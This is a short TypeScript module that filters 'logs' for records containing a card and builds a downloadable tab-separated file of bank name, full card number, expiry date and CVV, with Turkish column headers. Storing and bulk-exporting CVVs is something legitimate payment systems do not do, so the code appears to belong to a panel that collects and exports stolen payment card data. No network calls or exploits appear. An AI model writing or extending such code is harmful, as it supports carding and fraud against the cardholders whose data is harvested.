import { detectBankName } from './cardUtils';
import { hasCard } from './logQualify';

export interface LogCardExportRow {
  cardNumber?: string;
  expiryDate?: string;
  cvv?: string;
  bankName?: string;
}

export function normalizeCardNumber(card?: string): string {
  return (card || '').replace(/\D/g, '');
}

export function buildCardExportTxt(logs: LogCardExportRow[]): string {
  const rows = logs.filter((log) => hasCard(log));
  let txt = 'BANKA\tKART NO\tSKT\tCVV\n';

  for (const log of rows) {
    const cardNo = normalizeCardNumber(log.cardNumber);
    const bank = log.bankName || detectBankName(cardNo) || '';
    txt += `${bank}\t${cardNo}\t${log.expiryDate || ''}\t${log.cvv || ''}\n`;
  }

  return txt;
}

export function downloadTextFile(content: string, filename: string) {
  const blob = new Blob(['\uFEFF', content], { type: 'text/plain;charset=utf-8' });
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = filename;
  link.click();
  URL.revokeObjectURL(link.href);
}
